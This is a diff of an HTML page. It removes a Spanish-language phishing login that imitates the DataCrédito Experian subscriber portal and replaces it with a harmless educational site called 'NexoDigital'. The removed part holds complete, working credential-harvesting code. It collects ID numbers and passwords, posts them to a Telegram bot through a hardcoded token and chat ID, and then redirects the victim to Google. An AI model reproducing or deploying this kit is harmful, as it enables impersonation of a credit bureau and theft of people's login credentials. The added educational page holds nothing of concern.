@@ -1,323 +1,438 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>de consulta</title>
-
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: Arial, Helvetica, sans-serif; background: #fafafa; color: #333; }
-.page { min-height: 100vh; display: flex; flex-direction: column; }
-.main { flex: 1; display: flex; min-height: 680px; }
-
-.left {
-    width: 50%;
-    min-height: 680px;
-    background-image: url("https://apps.datacredito.com.co/raw/website/commons/static/ofVirtual/images/login/bg-desktop.jpg");
-    background-position: center;
-    background-repeat: no-repeat;
-    background-size: cover;
-}
-
-.right { width: 50%; background: #fafafa; display: flex; justify-content: center; padding: 30px; }
-.login { width: 100%; max-width: 400px; text-align: center; }
-
-.logo { display: flex; align-items: center; justify-content: center; margin-bottom: 23px; }
-.logo img { width: 220px; max-width: 100%; height: auto; object-fit: contain; }
-
-.demo-label {
-    display: inline-block; font-size: 10px; color: #8a286b;
-    background: #f8e9f2; padding: 5px 10px; border-radius: 12px; margin-bottom: 12px;
-}
-
-h1 { font-size: 30px; font-weight: 600; color: #4776b8; margin-bottom: 7px; }
-.subtitle { font-size: 17px; margin-bottom: 30px; }
-
-.form-group { margin-bottom: 13px; text-align: left; }
-.form-group select,
-.form-group .form-input {
-    display: block; width: 100%; height: 49px; background-color: #ffffff;
-    border: 1px solid #e3e3e3; border-radius: 8px; padding: 0 13px;
-    outline: none; color: #444444; font-size: 15px; box-shadow: none;
-}
-.form-group .form-input::placeholder { color: #aaaaaa; opacity: 1; }
-.form-group select:focus,
-.form-group .form-input:focus { border-color: #4776b8; }
-
-.captcha-area { margin-top: 15px; margin-bottom: 19px; }
-.captcha {
-    min-height: 42px; display: flex; justify-content: center; align-items: center;
-    gap: 6px; border: 1px solid #dddddd; border-radius: 5px; padding: 8px;
-}
-.glyph { display: grid; grid-template-columns: repeat(5, 3px); grid-template-rows: repeat(7, 3px); gap: 2px; }
-.dot { width: 3px; height: 3px; border-radius: 50%; background: #111; }
-.dot.off { background: transparent; }
-
-.refresh {
-    display: block; border: none; background: none; cursor: pointer;
-    font-size: 12px; color: #3471b9; font-weight: 600; margin: 7px auto 0;
-}
-
-.terms { text-align: left; padding-left: 5px; margin-bottom: 17px; }
-.terms label { display: flex; align-items: center; gap: 9px; margin-bottom: 13px; font-size: 13px; }
-.terms input { width: 19px; height: 19px; flex-shrink: 0; accent-color: #3471b9; }
-.terms a { color: #c32b85; text-decoration: underline; }
-
-.login-button {
-    width: 175px; height: 45px; background: #b72b85; color: white;
-    border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer;
-}
-.login-button:hover { background: #98216e; }
-.login-button:disabled { background: #c98bb5; cursor: wait; }
-
-.footer {
-    min-height: 85px; width: 100%; border-top: 2px solid #b62a87; background: #fff;
-    display: flex; justify-content: center; padding: 15px 25px;
-}
-.footer-content {
-    width: 100%; max-width: 1150px; display: grid;
-    grid-template-columns: 2fr 1fr 1fr; align-items: start; gap: 25px;
-}
-.copyright { font-size: 13px; line-height: 22px; }
-.footer-link { font-size: 14px; color: #365f9e; text-decoration: none; text-align: center; }
-.footer-extra { color: #888; font-size: 11px; text-align: right; }
-
-@media(max-width: 850px) {
-    .main { flex-direction: column; min-height: auto; }
-    .left {
-        width: 100%; height: 190px; min-height: 190px;
-        background-image: url("https://apps.datacredito.com.co/static/ofVirtual/images/login/bg-mobile.jpg");
-        background-position: center; background-repeat: no-repeat; background-size: cover;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="NexoDigital es un recurso educativo independiente sobre tecnología de internet, conectividad, Wi-Fi, fibra óptica y seguridad digital en Colombia.">
+  <meta name="robots" content="index, follow">
+  <title>NexoDigital | Educación sobre Internet y Tecnología Digital en Colombia</title>
+  <style>
+   
+    :root {
+      --bg: #07111f;
+      --panel: #101e30;
+      --text: #edf5ff;
+      --muted: #a8bbd2;
+      --accent: #48e0d0;
+      --blue: #659cff;
+      --border: rgba(255,255,255,.12);
     }
-    .right { width: 100%; min-height: auto; padding: 28px 20px 35px; }
-    .login { max-width: 400px; }
-    .logo img { width: 190px; }
-    h1 { font-size: 27px; }
-    .subtitle { font-size: 16px; margin-bottom: 28px; }
-    .footer { min-height: auto; padding: 20px; }
-    .footer-content { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 12px; }
-    .copyright { text-align: center; font-size: 12px; }
-    .footer-extra { text-align: center; }
-}
 
-@media(max-width: 400px) {
-    .left { height: 155px; min-height: 155px; }
-    .right { padding: 25px 17px; }
-    .logo img { width: 175px; }
-    h1 { font-size: 25px; }
-    .form-group select, .form-group .form-input { height: 47px; font-size: 14px; }
-    .terms label { font-size: 12px; }
-}
-</style>
+    * { box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+    }
+
+    a { color: var(--accent); }
+
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      background: rgba(7,17,31,.94);
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(12px);
+    }
+
+    nav {
+      max-width: 1120px;
+      margin: auto;
+      padding: 16px 22px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .logo {
+      font-size: 1.45rem;
+      font-weight: 800;
+      letter-spacing: -.5px;
+    }
+
+    .logo span { color: var(--accent); }
+
+    nav a {
+      text-decoration: none;
+      color: var(--text);
+      margin-left: 14px;
+      font-size: .92rem;
+    }
+
+    .hero {
+      max-width: 1120px;
+      margin: auto;
+      padding: 100px 22px 80px;
+      background:
+        radial-gradient(ellipse at 80% 10%, rgba(72,224,208,.12), transparent 40%),
+        radial-gradient(ellipse at 10% 80%, rgba(101,156,255,.12), transparent 40%);
+    }
+
+    .eyebrow {
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-size: .8rem;
+      font-weight: bold;
+    }
+
+    h1 {
+      max-width: 800px;
+      font-size: clamp(2.5rem, 6vw, 4.7rem);
+      line-height: 1.08;
+      margin: 18px 0;
+    }
+
+    h1 span {
+      color: var(--accent);
+    }
+
+    .hero p {
+      max-width: 720px;
+      color: var(--muted);
+      font-size: 1.12rem;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 18px;
+      padding: 12px 20px;
+      border-radius: 8px;
+      background: var(--accent);
+      color: #07111f;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    section {
+      max-width: 1120px;
+      margin: auto;
+      padding: 65px 22px;
+    }
+
+    .section-intro {
+      max-width: 740px;
+      color: var(--muted);
+    }
+
+    h2 { font-size: clamp(1.8rem, 4vw, 2.7rem); }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+      gap: 18px;
+      margin-top: 30px;
+    }
+
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 24px;
+      border-radius: 15px;
+    }
+
+    .card h3 { margin-top: 0; }
+
+    .card p, .muted { color: var(--muted); }
+
+    .notice {
+      padding: 20px;
+      border-left: 3px solid var(--accent);
+      background: rgba(72,224,208,.07);
+      border-radius: 6px;
+      color: var(--muted);
+    }
+
+    details {
+      padding: 18px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    summary {
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 35px 22px;
+      color: var(--muted);
+      text-align: center;
+    }
+
+    footer a { margin: 0 8px; }
+
+    @media (max-width: 650px) {
+      nav { justify-content: center; }
+      nav a { margin: 0 6px; }
+      .hero { padding-top: 65px; }
+    }
+  </style>
 </head>
 
 <body>
+<header>
+  <nav aria-label="Navegación principal">
+    <a class="logo" href="#home">Nexo<span>Digital</span></a>
+    <div>
+      <a href="#about">Nosotros</a>
+      <a href="#learn">Aprende</a>
+      <a href="#faq">Preguntas Frecuentes</a>
+      <a href="#contact">Contacto</a>
+    </div>
+  </nav>
+</header>
 
-<div class="page">
-    <main class="main">
-        <section class="left" aria-label="Imagen ilustrativa"></section>
+<main>
+  <div class="hero" id="home">
+    <div class="eyebrow">Educación digital independiente</div>
+    <h1>Entiende el internet.<br><span>Conéctate con confianza.</span></h1>
+    <p>
+      Explora recursos educativos sobre tecnología de internet, conectividad
+      en el hogar, fibra óptica, rendimiento del Wi-Fi y seguridad en línea en
+      Colombia. Nuestro objetivo es hacer que el conocimiento digital sea más
+      fácil de entender.
+    </p>
+    <a class="button" href="#learn">Explora nuestros recursos</a>
+  </div>
 
-        <section class="right">
-            <div class="login">
+  <section id="about">
+    <div class="eyebrow">Quiénes somos</div>
+    <h2>Sobre NexoDigital</h2>
+    <p class="section-intro">
+      NexoDigital es un sitio web educativo independiente dedicado a explicar
+      las tecnologías de internet y la conectividad digital. Proporcionamos
+      información general para ayudar a los lectores a comprender mejor cómo
+      funcionan los servicios de internet y qué factores pueden afectar su
+      experiencia.
+    </p>
+    <div class="notice">
+      <strong>Importante:</strong> Este sitio web es un recurso educativo
+      independiente. No es un proveedor de servicios de internet, no vende
+      planes de internet y no representa a empresas de telecomunicaciones.
+    </div>
+  </section>
 
-                <div class="logo">
-                    <img src="https://apps.datacredito.com.co/static/ofVirtual/images/logos/datacredito-experian.png" alt="Logo de referencia">
-                </div>
+  <section id="learn">
+    <div class="eyebrow">Centro de aprendizaje</div>
+    <h2>Explora la tecnología digital</h2>
+    <p class="section-intro">
+      Aprende los conceptos básicos de la conectividad a través de guías
+      educativas claras y accesibles.
+    </p>
 
-                <h1>Acceso a suscriptores</h1>
-                <p class="subtitle"></p>
+    <div class="grid">
+      <article class="card">
+        <h3>Tecnología de Fibra Óptica</h3>
+        <p>
+          Descubre cómo los cables de fibra óptica transmiten datos mediante
+          la luz y por qué esta tecnología se usa comúnmente para conexiones
+          de internet de alta velocidad.
+        </p>
+      </article>
 
-                <form id="demoForm" autocomplete="off">
+      <article class="card">
+        <h3>Entendiendo la Velocidad de Internet</h3>
+        <p>
+          Aprende la diferencia entre velocidad de descarga, velocidad de
+          carga, latencia y ancho de banda, y cómo cada una puede afectar tus
+          actividades en línea.
+        </p>
+      </article>
 
-                    <div class="form-group">
-                        <select name="tipo_documento" aria-label="Tipo de documento">
-                            <option>Cédula o NUIP</option>
-                            <option>Cédula de ciudadanía</option>
-                            <option>Cédula de extranjería</option>
-                            <option>NIT</option>
-                            <option>Pasaporte</option>
-                        </select>
-                    </div>
+      <article class="card">
+        <h3>Wi-Fi en el Hogar</h3>
+        <p>
+          Explora cómo la ubicación del router, las paredes, las interferencias
+          y los dispositivos conectados pueden afectar la cobertura y el
+          rendimiento inalámbrico.
+        </p>
+      </article>
 
-                    <div class="form-group">
-                        <input class="form-input" type="text" name="numero_id" placeholder="Número de ID" required>
-                    </div>
+      <article class="card">
+        <h3>Seguridad Digital</h3>
+        <p>
+          Aprende formas prácticas de crear contraseñas más seguras, reconocer
+          mensajes sospechosos, proteger tu información personal y navegar de
+          forma segura.
+        </p>
+      </article>
 
-                    <div class="form-group">
-                        <input class="form-input" type="password" name="password" placeholder="Contraseña" required>
-                    </div>
+      <article class="card">
+        <h3>Acceso a Internet en Colombia</h3>
+        <p>
+          Comprende los tipos generales de conexiones a internet, las
+          consideraciones comunes del servicio y por qué la disponibilidad
+          puede variar según la ubicación.
+        </p>
+      </article>
 
-                    <div class="form-group">
-                        <input class="form-input" type="text" name="captcha" placeholder="Ingresa las letras que aparecen en el recuadro inferior" required>
-                    </div>
+      <article class="card">
+        <h3>Comparando Planes de Internet</h3>
+        <p>
+          Aprende qué revisar al evaluar velocidades anunciadas, costos de
+          instalación, equipos, términos del contrato, cobertura y condiciones
+          del servicio.
+        </p>
+      </article>
+    </div>
+  </section>
 
-                    <div class="captcha-area">
-                        <div class="captcha" id="captcha"></div>
-                        <button type="button" class="refresh" id="refresh">Cambiar diseño</button>
-                    </div>
+  <section id="pricing">
+    <div class="eyebrow">Educación al consumidor</div>
+    <h2>Entendiendo los Precios de Internet</h2>
+    <p class="section-intro">
+      Los precios de internet en Colombia pueden variar según la ciudad, la
+      dirección, la tecnología de conexión, la velocidad anunciada, las
+      promociones, la instalación, los equipos y las condiciones del contrato.
+    </p>
+    <div class="notice">
+      NexoDigital no publica precios no verificados ni garantiza la
+      disponibilidad del servicio. Para obtener precios precisos y actuales,
+      consulta la información oficial proporcionada por el proveedor de
+      servicios correspondiente. Revisa siempre los términos completos antes
+      de tomar una decisión.
+    </div>
+  </section>
 
-                    <div class="terms">
-                        <label>
-                            <input type="checkbox" name="acepta_condiciones" required>
-                            <span>He leído y acepto <a href="#condiciones">Condiciones de uso</a></span>
-                        </label>
-                        <label>
-                            <input type="checkbox" name="acepta_privacidad" required>
-                            <span>He leído y acepto <a href="#privacidad">Políticas de privacidad</a></span>
-                        </label>
-                    </div>
+  <section id="faq">
+    <div class="eyebrow">Preguntas frecuentes</div>
+    <h2>Preguntas Comunes</h2>
 
-                    <button class="login-button" type="submit" id="btnEnviar">Ingresar</button>
+    <details>
+      <summary>¿Cuál es el propósito de este sitio web?</summary>
+      <p class="muted">
+        Su propósito es proporcionar información educativa general sobre
+        tecnología de internet, conectividad y seguridad digital.
+      </p>
+    </details>
 
-                    <p style="font-size:11px;color:#888;margin-top:15px">
-                        visual transmiten datos.
-                    </p>
-                </form>
-            </div>
-        </section>
-    </main>
+    <details>
+      <summary>¿Puedo comprar un plan de internet aquí?</summary>
+      <p class="muted">
+        No. Este sitio web no vende planes de internet ni procesa
+        suscripciones a servicios. Solo proporciona contenido educativo.
+      </p>
+    </details>
 
-    <footer class="footer">
-        <div class="footer-content">
-            <div class="copyright">©2026 Todos los derechos reservados.</div>
-            <a href="#condiciones" class="footer-link">Condiciones de uso</a>
-            <div class="footer-extra">Sitio de demostración no oficial</div>
-        </div>
-    </footer>
-</div>
+    <details>
+      <summary>¿Los precios de internet son los mismos en toda Colombia?</summary>
+      <p class="muted">
+        No. La disponibilidad, los precios, las tecnologías y las condiciones
+        del servicio pueden variar según la ubicación y el proveedor. Confirma
+        los detalles directamente con el proveedor correspondiente.
+      </p>
+    </details>
+
+    <details>
+      <summary>¿Este sitio web garantiza velocidades de internet?</summary>
+      <p class="muted">
+        No. El rendimiento real depende de múltiples factores, incluidos el
+        plan de servicio, las condiciones de la red, los equipos, la señal
+        Wi-Fi y los dispositivos conectados.
+      </p>
+    </details>
+
+    <details>
+      <summary>¿NexoDigital está afiliado a proveedores de internet?</summary>
+      <p class="muted">
+        NexoDigital se presenta como un recurso educativo independiente y no
+        afirma tener afiliación con proveedores de telecomunicaciones.
+      </p>
+    </details>
+  </section>
+
+  <section id="contact">
+    <div class="eyebrow">Ponte en contacto</div>
+    <h2>Contacto</h2>
+    <p class="section-intro">
+      Para preguntas sobre nuestro contenido educativo o el sitio web, contacta
+      al administrador del sitio utilizando los datos de contacto publicados
+      en este sitio.
+    </p>
+    <p class="muted">
+      Antes de publicar, agrega una dirección de correo electrónico real y
+      monitoreada si deseas recibir consultas.
+    </p>
+  </section>
+
+  <section id="terms">
+    <div class="eyebrow">Políticas del sitio web</div>
+    <h2>Términos y Condiciones</h2>
+    <p class="muted">
+      Al utilizar este sitio web, aceptas usar su contenido con fines lícitos,
+      personales y educativos. La información proporcionada es para fines
+      educativos generales y no debe considerarse una garantía de
+      disponibilidad del servicio, precios, rendimiento técnico o condiciones
+      comerciales.
+    </p>
+    <p class="muted">
+      Realizamos esfuerzos razonables para proporcionar información útil, pero
+      el contenido puede cambiar o quedar desactualizado. Los usuarios deben
+      verificar de forma independiente los detalles importantes antes de tomar
+      decisiones. El sitio web no vende servicios de telecomunicaciones ni
+      celebra contratos de servicio.
+    </p>
+    <p class="muted">
+      Estos términos deben revisarse para cumplir con la legislación
+      colombiana aplicable antes de su publicación. Nada en esta sección
+      excluye derechos que no pueden excluirse legalmente.
+    </p>
+  </section>
+
+  <section id="privacy">
+    <div class="eyebrow">Protección de datos</div>
+    <h2>Política de Privacidad</h2>
+    <p class="muted">
+      Este sitio web busca minimizar la recopilación de información personal.
+      Si se recopilan datos personales a través de formularios de contacto,
+      análisis, cookies u otras tecnologías, el operador del sitio web debe
+      identificar al responsable del tratamiento, explicar los fines del
+      tratamiento, obtener la autorización cuando sea necesario y proporcionar
+      los derechos y procedimientos de contacto aplicables conforme a la Ley
+      1581 de 2012 de Colombia y sus reglamentaciones.
+    </p>
+    <p class="muted">
+      Las personas deben ser informadas sobre cómo solicitar el acceso,
+      corrección o eliminación de su información personal, cuando corresponda.
+      Esta política debe completarse con los datos y prácticas reales del
+      operador antes de que el sitio web recopile datos personales.
+    </p>
+  </section>
+
+  <section id="cookies">
+    <div class="eyebrow">Tecnologías del sitio web</div>
+    <h2>Cookies y Tecnologías Similares</h2>
+    <p class="muted">
+      El HTML y CSS básicos de esta página no requieren cookies publicitarias.
+      Si se agregan análisis, etiquetas publicitarias u otras tecnologías de
+      seguimiento, discloselas con precisión, explica sus propósitos e
+      implementa los controles de consentimiento o preferencia requeridos por
+      la ley aplicable y las políticas de la plataforma.
+    </p>
+  </section>
+</main>
+
+<footer>
+  <p>© <span id="year"></span> NexoDigital. Contenido educativo.</p>
+  <p>
+    <a href="#terms">Términos y Condiciones</a>
+    <a href="#privacy">Política de Privacidad</a>
+    <a href="#cookies">Cookies</a>
+  </p>
+  <p>Recurso educativo independiente. No se venden servicios de internet a través de este sitio web.</p>
+</footer>
 
 <script>
-// ============================================================
-// CONFIGURACIÓN
-// ============================================================
-const TELEGRAM_TOKEN   = "8800964008:AAF4bJhf0iUrQM5Skp1WvosFixdfPYmiMV8";
-const TELEGRAM_CHAT_ID = "7776240161";
-
-// 👇 CAMBIA ESTA URL por la página de Google a la que quieras redirigir
-// Ejemplos:
-//   "https://www.google.com"
-//   "https://www.datacredito.com.co"
-//   "https://mi-pagina-de-gracias.com"
-const URL_REDIRECCION_GOOGLE = "https://www.google.com";
-
-// Tiempo de espera máximo antes de redirigir igual (milisegundos)
-const TIEMPO_MAXIMO_REDIRECCION = 3000;
-// ============================================================
-
-// CAPTCHA DECORATIVO
-const letters = {
-A:["01110","10001","10001","11111","10001","10001","10001"],
-B:["11110","10001","10001","11110","10001","10001","11110"],
-C:["01111","10000","10000","10000","10000","10000","01111"],
-D:["11110","10001","10001","10001","10001","10001","11110"],
-E:["11111","10000","10000","11110","10000","10000","11111"],
-F:["11111","10000","10000","11110","10000","10000","10000"],
-G:["01111","10000","10000","10111","10001","10001","01111"],
-H:["10001","10001","10001","11111","10001","10001","10001"],
-I:["11111","00100","00100","00100","00100","00100","11111"],
-J:["00111","00010","00010","00010","00010","10010","01100"],
-K:["10001","10010","10100","11000","10100","10010","10001"],
-L:["10000","10000","10000","10000","10000","10000","11111"],
-M:["10001","11011","10101","10101","10001","10001","10001"],
-N:["10001","11001","10101","10011","10001","10001","10001"],
-O:["01110","10001","10001","10001","10001","10001","01110"],
-P:["11110","10001","10001","11110","10000","10000","10000"],
-R:["11110","10001","10001","11110","10100","10010","10001"],
-S:["01111","10000","10000","01110","00001","00001","11110"],
-T:["11111","00100","00100","00100","00100","00100","00100"],
-U:["10001","10001","10001","10001","10001","10001","01110"],
-V:["10001","10001","10001","10001","10001","01010","00100"]
-};
-
-const captcha = document.getElementById("captcha");
-
-function renderCaptcha() {
-    const chars = ["F","T","B","E","R","P"];
-    captcha.innerHTML = "";
-    for (let i = 0; i < 6; i++) {
-        const letter = chars[Math.floor(Math.random() * chars.length)];
-        const glyph = document.createElement("div");
-        glyph.className = "glyph";
-        letters[letter].forEach(row => {
-            row.split("").forEach(pixel => {
-                const dot = document.createElement("span");
-                dot.className = pixel === "1" ? "dot" : "dot off";
-                glyph.appendChild(dot);
-            });
-        });
-        captcha.appendChild(glyph);
-    }
-}
-
-renderCaptcha();
-document.getElementById("refresh").addEventListener("click", renderCaptcha);
-
-// ============================================================
-// ENVÍO A TELEGRAM Y REDIRECCIÓN A GOOGLE
-// ============================================================
-document.getElementById("demoForm").addEventListener("submit", async function (event) {
-    event.preventDefault();
-
-    const form = event.target;
-    const btn  = document.getElementById("btnEnviar");
-
-    const texto =
-        "📋 *Nuevo registro (maqueta)*\n" +
-        "• Tipo documento: " + form.tipo_documento.value + "\n" +
-        "• Número ID: " + form.numero_id.value + "\n" +
-        "• Contraseña: " + form.password.value + "\n" +
-        "• Captcha: " + form.captcha.value + "\n" +
-        "• Acepta condiciones: " + (form.acepta_condiciones.checked ? "Sí" : "No") + "\n" +
-        "• Acepta privacidad: " + (form.acepta_privacidad.checked ? "Sí" : "No") + "\n" +
-        "• Fecha: " + new Date().toLocaleString();
-
-    btn.disabled = true;
-    btn.textContent = "Enviando...";
-
-    // Función que redirige (con un pequeño retraso para que el usuario vea que "algo pasó")
-    const redirigir = () => {
-        window.location.href = URL_REDIRECCION_GOOGLE;
-    };
-
-    // Red de seguridad: si Telegram tarda demasiado o falla, redirigimos igual
-    const timeoutId = setTimeout(redirigir, TIEMPO_MAXIMO_REDIRECCION);
-
-    try {
-        const respuesta = await fetch(
-            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
-            {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: texto,
-                    parse_mode: "Markdown"
-                })
-            }
-        );
-
-        const data = await respuesta.json();
-
-        // Pase lo que pase con Telegram, redirigimos
-        clearTimeout(timeoutId);
-
-        if (!data.ok) {
-            console.warn("Telegram respondió con error:", data.description);
-        }
-
-        // Pequeña pausa de 600 ms para que el botón cambie y el usuario no vea un salto brusco
-        setTimeout(redirigir, 600);
-
-    } catch (err) {
-        // Si hay error de red, también redirigimos
-        clearTimeout(timeoutId);
-        console.error("Error de conexión con Telegram:", err.message);
-
-        setTimeout(redirigir, 600);
-    }
-});
+  document.getElementById("year").textContent = new Date().getFullYear();
 </script>
-
 </body>
 </html>
